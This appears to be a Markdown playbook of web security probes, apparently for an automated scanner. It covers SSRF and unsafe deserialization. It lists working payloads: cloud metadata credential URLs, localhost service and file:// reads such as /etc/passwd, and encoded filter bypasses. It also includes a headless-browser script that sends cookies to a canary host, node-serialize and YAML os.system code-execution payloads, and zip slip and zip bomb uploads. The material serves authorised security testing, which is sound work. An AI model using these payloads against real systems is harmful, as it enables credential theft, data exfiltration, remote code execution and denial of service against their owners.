# Deserialization & SSRF Probes

Outbound network abuse and unsafe parser exploitation, tested live.

## Input slot enumeration

Scan all endpoints for parameters named: `url`, `callback`, `webhook`, `image`, `redirect`, `target`, `host`, `upstream`, `fetch`, `proxy`, `import`, `source`, `src`, `uri`, `link`, `origin`.

Scan for body fields accepting serialized content: fields named `data`, `payload`, `config`, `yaml`, `pickle` (obviously), `state`, `session`; any multipart file upload with `.yaml`/`.yml`/`.pkl`/`.rds`/`.joblib` extensions.

## SSRF — cloud metadata (Band 1)

```
PROBE: ssrf-aws-imds-v1
BAND: 1
ATTACK (each URL-accepting slot):
  http://169.254.169.254/latest/meta-data/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
SIGNAL:
  CONFIRMED if response contains IMDS directory listing OR credentials JSON
  LIKELY if endpoint-specific 5xx different from random-public-URL baseline
```

```
PROBE: ssrf-gcp-metadata
BAND: 1
ATTACK:
  http://metadata.google.internal/computeMetadata/v1/instance/
  http://169.254.169.254/computeMetadata/v1/instance/
  (some GCP setups require `Metadata-Flavor: Google`; try both with and without if custom header can be injected)
SIGNAL: same as AWS
```

```
PROBE: ssrf-azure-imds
BAND: 1
ATTACK:
  http://169.254.169.254/metadata/instance?api-version=2021-02-01
  (requires `Metadata: true` header — try if headers are passthrough)
SIGNAL: same
```

## SSRF — localhost services (Band 1)

```
PROBE: ssrf-localhost-services
BAND: 1
ATTACK:
  http://127.0.0.1:6379/            # Redis
  http://127.0.0.1:9200/             # Elasticsearch
  http://127.0.0.1:5432/             # Postgres (weak — often closed port)
  http://127.0.0.1:8080/             # common admin ports
  http://127.0.0.1:3306/
  http://[::1]/
SIGNAL:
  CONFIRMED if response shape matches the service (Redis "-ERR", ES JSON, etc.)
  LEAD if response differs from random-IP baseline
```

## SSRF — bypass variants (Band 1)

If standard SSRF payloads are blocked:

```
PROBE: ssrf-bypass-variants
BAND: 1
ATTACK:
  http://169.254.169.254.nip.io/
  http://169-254-169-254.nip.io/
  http://2130706433/                # decimal 127.0.0.1
  http://0x7f000001/                # hex 127.0.0.1
  http://017700000001/              # octal
  http://evil.example@169.254.169.254/   # userinfo trick
  http://169.254.169.254%23.evil.example/  # fragment trick
  http://0.0.0.0/
  http://localtest.me/
  http://customer1.app.localhost.<target-domain>/   # DNS rebinding via wildcard
SIGNAL:
  CONFIRMED if any bypass reaches forbidden infrastructure
```

## SSRF — OOB callback (Band 2)

```
PROBE: ssrf-oob-callback
BAND: 2
PREREQ: --canary-webhook URL (user-controlled)
ATTACK:
  Fire the URL-accepting endpoint with http://{canary}/probe-<id>
SIGNAL:
  CONFIRMED if canary receives the request within 30s (with probe-id in URL so correlation is certain)
```

## SSRF — file:// and schemes (Band 1)

```
PROBE: ssrf-file-scheme
BAND: 1
ATTACK:
  file:///etc/hostname
  file:///etc/passwd
  file:///proc/self/cmdline
SIGNAL:
  CONFIRMED if response contains file contents
```

```
PROBE: ssrf-exotic-schemes
BAND: 1
ATTACK:
  gopher://127.0.0.1:6379/_SET%20foo%20bar
  dict://127.0.0.1:11211/stat
  ldap://127.0.0.1:389/
  sftp://127.0.0.1:22/
SIGNAL:
  LIKELY if response differs from https://public-baseline
```

## SSRF — headless browser (Band 2)

If the target uses a headless browser (PDF generation, screenshots, page scraping):

```
PROBE: ssrf-headless-exfil
BAND: 2
ATTACK:
  Supply HTML/JS-in-URL that does a fetch to canary URL from the headless context:
  data:text/html,<script>fetch('{canary}/probe-<id>?cookies='+btoa(document.cookie))</script>
SIGNAL:
  CONFIRMED if canary receives request from target's egress IP
  Note: This exfiltrates browser-session data if the headless browser shares auth state — critical if so.
```

## Deserialization (Band 1–2)

**Pickle:**

Most Python services don't accept pickle directly from users. Test endpoints that accept file uploads or serialized blobs:

```
PROBE: deser-pickle
BAND: 2
ATTACK:
  Construct a pickle that, when unpickled, makes a DNS lookup to {canary}:
  (uses python -c "import pickle; print(pickle.dumps(...))")
  Send as body (matching whatever Content-Type the endpoint accepts)
SIGNAL:
  CONFIRMED if canary DNS lookup received
```

**Node node-serialize:**

Less common but if present:

```
PROBE: deser-node-serialize
BAND: 2
ATTACK:
  Payload: {"rce":"_$$ND_FUNC$$_function(){require('http').get('{canary}/probe-<id>')}()"}
SIGNAL:
  CONFIRMED if canary receives request
```

**YAML unsafe-load:**

```
PROBE: deser-yaml-unsafe
BAND: 2
ATTACK:
  Content-Type: application/x-yaml or multipart with .yaml file
  Body:
    !!python/object/apply:os.system
    args: ['curl {canary}/probe-<id>']
  (Also try the Ruby-style `--- !ruby/object:Foo`)
SIGNAL:
  CONFIRMED via canary
```

## Archive bomb / zip slip (Band 2)

For file upload endpoints accepting archives:

```
PROBE: archive-zip-slip
BAND: 2
ATTACK:
  Upload a zip containing an entry named `../../canary-probe-<id>.txt`
FOLLOW-UP:
  Probe well-known paths (`/tmp/canary-probe-<id>.txt`, `/var/www/canary-probe-<id>.txt`) via an exposed file-serving route.
SIGNAL:
  CONFIRMED if the canary file is reachable outside the intended extraction directory
```

```
PROBE: archive-bomb
BAND: 3
ATTACK:
  Upload a 42.zip (1kb → 4.5PB uncompressed) OR a gzip-bomb
SIGNAL:
  CONFIRMED if server resource usage spikes / 5xx with OOM signatures
  NOTE: This is a DoS — only on local or fully-isolated staging with explicit consent
```

## Output additions

```
sink: imds | localhost-service | file-scheme | oob-http | oob-dns | deser-pickle | deser-node | deser-yaml | archive-slip | archive-bomb
target: <the URL / payload that reached the sink>
egress_observed: <did a canary receive traffic, and what did it see?>
```
